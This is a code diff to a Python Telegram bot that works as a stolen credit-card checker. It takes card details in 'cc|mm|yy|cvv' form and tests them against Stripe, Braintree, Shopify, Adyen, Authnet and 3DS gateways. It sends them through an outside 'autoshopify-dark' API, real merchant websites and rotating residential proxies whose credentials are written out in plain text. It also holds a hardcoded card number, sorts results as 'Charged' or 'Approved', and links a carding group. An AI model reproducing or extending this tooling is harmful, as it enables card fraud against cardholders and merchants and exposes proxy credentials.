@@ -572,21 +572,20 @@ async def auth_sub_menu_handler(update: Update, context: ContextTypes.DEFAULT_TY
     text = (
         "✦━━━✦🚪 𝘼𝙐𝙏𝙃 𝙂𝘼𝙏𝙀𝙎 🚪✦━━✦\n\n"
         
-        "🟥 <b>Stripe Auth</b>\n"
+        "💎<b>Stripe Auth</b>💎\n"
         f"{bullet_link} 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐡𝐞𝐜𝐤 : <code>/chk cc|mm|yy|cvv</code>\n"
         f"{bullet_link} 𝐌𝐚𝐬𝐬 𝐂𝐡𝐞𝐜𝐤   : <code>/mass cc|mm|yy|cvv</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬       : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   : 𝑺𝒕𝒓𝒊𝒑𝒆 𝑨𝒖𝒕𝒉\n"
         "────────────────────────\n\n"
-        
-        "🟦 <b>Braintree Premium</b>\n"
+        "💎<b>Braintree Premium</b>💎\n"
         f"{bullet_link} 𝐒𝐢𝐧𝐠𝐥𝐞 𝐀𝐮𝐭𝐡  : <code>/b3 cc|mm|yy|cvv</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬       : 𝑨𝒄𝒕𝒊𝒗𝒆 ✅\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   : 𝑩𝒓𝒂𝒊𝒏𝒕𝒓𝒆𝒆 𝑨𝒖𝒕𝒉\n"
         "────────────────────────\n\n"
 
         "🛡️✨ 𝘼𝗹𝗹 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 | 𝗡𝗼 𝗥𝗮𝘁𝗲 𝗥𝗲𝘀𝘁𝗿𝗶𝗰𝘁𝗶𝗼𝗻𝘀!\n"
-        "✦════════════════════════✦"
+        "✦═════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -676,7 +675,7 @@ async def shopify_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         f"{bullet_link} 𝐂𝐌𝐃   :<code>/sh</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
-        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$0.98</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$0.98</i>\n"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -712,7 +711,7 @@ async def adyen_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
         f"{bullet_link} 𝐂𝐌𝐃   :<code>/ad</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Adyen</i>\n"
-        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$1</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$1</i>\n"
     )
 
     keyboard = [
@@ -750,7 +749,7 @@ async def ocean_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
         f"{bullet_link} 𝐂𝐌𝐃   :<code>/oc</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Ocean Payments</i>\n"
-        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$4</i>\n"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$4</i>\n"
     )
 
     # Define buttons as a list of rows
@@ -789,8 +788,8 @@ async def autoshopify_gate_handler(update: Update, context: ContextTypes.DEFAULT
         f"{bullet_link} 𝐎𝐰𝐧 𝐒𝐢𝐭𝐞  : <code>/seturl &lt;site&gt;</code>\n"
         f"{bullet_link} 𝐌𝐮𝐥𝐭𝐢𝐩𝐥𝐞 𝐒𝐢𝐭𝐞𝐬 : <code>/adurls &lt;site&gt;</code>\n\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
-        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
-        "✦════════════════════✦"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞 : <i>Shopify</i>\n"
+        "✦═════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -825,8 +824,8 @@ async def shopify10_gate_handler(update: Update, context: ContextTypes.DEFAULT_T
         f"{bullet_link} 𝐂𝐌𝐃   : <code>/hc</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Shopify</i>\n"
-        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$10</i>\n"
-        "✦═══════════════════✦"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$10</i>\n"
+        "✦═══════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -861,8 +860,8 @@ async def authnet36_gate_handler(update: Update, context: ContextTypes.DEFAULT_T
         f"{bullet_link} 𝐂𝐌𝐃   : <code>/at</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Authnet</i>\n"
-        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$1.0</i>\n"
-        "✦══════════════════✦"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$1.0</i>\n"
+        "✦══════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -899,8 +898,8 @@ async def stripe_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
         f"{bullet_link} 𝐂𝐌𝐃   : <code>/st</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Stripe</i>\n"
-        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$1</i>\n"
-        "✦════════════════✦"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$1</i>\n"
+        "✦══════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -935,8 +934,8 @@ async def stripe3_gate_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         f"{bullet_link} 𝐂𝐌𝐃   : <code>/st1</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>Stripe</i>\n"
-        f"{bullet_link} 𝐏𝐫𝐢𝐜𝐞   : <i>$3</i>\n"
-        "✦════════════════✦"
+        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 𝐂𝐡𝐚𝐫𝐠𝐞   : <i>$3</i>\n"
+        "✦════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -971,7 +970,7 @@ async def ds_lookup_menu_handler(update: Update, context: ContextTypes.DEFAULT_T
         f"{bullet_link} 𝐂𝐌𝐃   : <code>/vbv &lt;card|mm|yy|cvv&gt;</code>\n"
         f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬  : <i>𝑨𝒄𝒕𝒊𝒗𝒆 ✅</i>\n"
         f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 : <i>3DS / VBV</i>\n"
-        "✦════════════════════✦"
+        "✦═════════════════✦"
     )
 
     keyboard = InlineKeyboardMarkup([
@@ -2622,7 +2621,7 @@ logger = logging.getLogger(__name__)
 import urllib.parse
 
 AUTOSH_BASE = "https://autoshopify-dark.sevalla.app/index.php"
-DEFAULT_PROXY = "67.227.113.12:5552:juftilus:atasaxde44jl"
+DEFAULT_PROXY = "142.111.48.253:7030:fvbysspi:bsbh3trstb1c"
 
 async def changeshsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     global CURRENT_SHOPIFY_SITE
@@ -2929,7 +2928,7 @@ logger = logging.getLogger(__name__)
 import urllib.parse
 
 AUTOSH_BASE = "https://autoshopify-dark.sevalla.app/index.php"
-HC_PROXY = "31.59.27.148:6725:juftilus:atasaxde44jl"
+HC_PROXY = "198.23.239.134:6540:fvbysspi:bsbh3trstb1c"
 
 async def process_hc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     """
@@ -3173,7 +3172,7 @@ logger = logging.getLogger(__name__)
 import urllib.parse
 
 AUTOSH_BASE = "https://autoshopify-dark.sevalla.app/index.php"
-ST1_PROXY = "23.27.184.87:5688:juftilus:atasaxde44jl"
+ST1_PROXY = "45.38.107.97:6014:fvbysspi:bsbh3trstb1c"
 ST1_SITE = "https://vasileandpavel.com"
 
 async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
@@ -3467,7 +3466,7 @@ async def process_oc(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"?site=https://arabellahair.com"
             f"&cc={full_card}"
             f"&gateway=ocean"
-            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+            f"&proxy=107.172.163.27:6543:fvbysspi:bsbh3trstb1c"
         )
 
         async with aiohttp.ClientSession() as session:
@@ -3700,7 +3699,7 @@ logger = logging.getLogger(__name__)
 
 # --- Config ---
 AUTOSH_AT_API = "https://autoshopify-dark.sevalla.app/index.php"
-DEFAULT_PROXY = "82.29.225.78:5933:juftilus:atasaxde44jl"
+DEFAULT_PROXY = "64.137.96.74:6641:fvbysspi:bsbh3trstb1c"
 AUTHNET_DEFAULT_SITE = "https://store.birkman.com"
 
 
@@ -3995,7 +3994,7 @@ logger = logging.getLogger(__name__)
 
 # --- Config ---
 ADYEN_API = "https://autoshopify-dark.sevalla.app/index.php"
-DEFAULT_PROXY = "82.29.225.78:5933:juftilus:atasaxde44jl"
+DEFAULT_PROXY = "154.203.43.247:5536:fvbysspi:bsbh3trstb1c"
 ADYEN_DEFAULT_SITE = "https://pizazzhair.com"
 
 async def consume_credit(user_id: int) -> bool:
@@ -4251,7 +4250,7 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
         "https://autoshopify-dark.sevalla.app/index.php"
         f"?site={site_input}"
         f"&cc={cc_input}"
-        "&proxy=23.27.209.235:6254:juftilus:atasaxde44jl"
+        "&proxy=84.247.60.125:6095:fvbysspi:bsbh3trstb1c"
     )
 
     BULLET_GROUP_LINK = "https://t.me/CARDER33"
@@ -4302,7 +4301,6 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
             f"{bullet_link} <b>𝐒𝐢𝐭𝐞</b> ➵ <code>{escape(site_input)}</code>\n"
             f"{bullet_link} <b>𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬</b> ➵ {len(current_sites)}\n"
             f"{bullet_link} <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b> ➵ {gateway}\n"
-            f"{bullet_link} <b>𝐂𝐂</b> ➵ <code>{escape(cc_input)}</code>\n"
             f"{bullet_link} <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b> ➵ <i>{escape(response)}</i>\n"
             f"{bullet_link} <b>𝐏𝐫𝐢𝐜𝐞</b> ➵ {escape(str(price))}$ 💸\n"
             "――――――――――――――――\n"
@@ -4329,12 +4327,6 @@ async def process_seturl(user, user_id, site_input, cc_input, processing_msg):
             f"❌ Error: <code>{escape(str(e))}</code>",
             parse_mode=ParseMode.HTML
         )
-
-
-
-
-
-
 
 
 
@@ -4418,7 +4410,7 @@ API_CHECK_TEMPLATE = (
     "https://autoshopify-dark.sevalla.app/index.php"
     "?site={site}"
     "&cc={card}"
-    "&proxy=92.113.7.244:6970:juftilus:atasaxde44jl"
+    "&proxy=216.10.27.159:6837:fvbysspi:bsbh3trstb1c"
 )
 
 # ===== Main Command =====
@@ -4571,7 +4563,7 @@ async def process_card_check(user, card_input, custom_urls, msg):
         header_status = "❌ Declined"  # default
         if re.search(r"\b(Thank You|ORDER_PLACED|approved|success|charged)\b", response_text, re.I):
             header_status = "🔥 Charged"
-        elif "3DS_AUTHENTICATION" in response_text.upper():
+        elif "3D_AUTHENTICATION" in response_text.upper():
             header_status = "✅ Approved"
         elif "INVALID_CVC" in response_text.upper():
             header_status = "✅ Approved"
@@ -4651,7 +4643,7 @@ API_TEMPLATE = (
     "https://autoshopify-dark.sevalla.app/index.php"
     "?site={site_url}"
     "&cc=4312311807552605|08|2031|631"
-    "&proxy=104.252.49.178:6114:juftilus:atasaxde44jl"
+    "&proxy=142.111.67.146:5611:fvbysspi:bsbh3trstb1c"
 )
 
 # === Credit system ===
@@ -5099,7 +5091,7 @@ async def run_msp(update: Update, cards, base_url, sites, msg):
     }
 
     async with httpx.AsyncClient() as session:
-        proxy = "192.198.126.20:7063:juftilus:atasaxde44jl"
+        proxy = "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
 
         async def check_one(card, site):
             card_str = "|".join(card) if isinstance(card, (tuple, list)) else str(card)
@@ -7049,7 +7041,7 @@ from db import init_db
 from force_join import force_join, check_joined_callback  # import decorator & callback
 
 # 🛡️ Security
-AUTHORIZED_CHATS = set([-1002554243871, -1002832894194, -1002996641591, -1002750403340, -1003007390596, -1003040961439, -1002905834316])  # Only these groups
+AUTHORIZED_CHATS = set([-1002554243871, -1002832894194, -1002996641591, -1002750403340, -1003007390596, -1003040961439, -1002905834316, -1002660201006, -1002397483185])  # Only these groups
 OWNER_ID = 8493360284                     # Your Telegram user ID
 
 # 🛑 Banned users
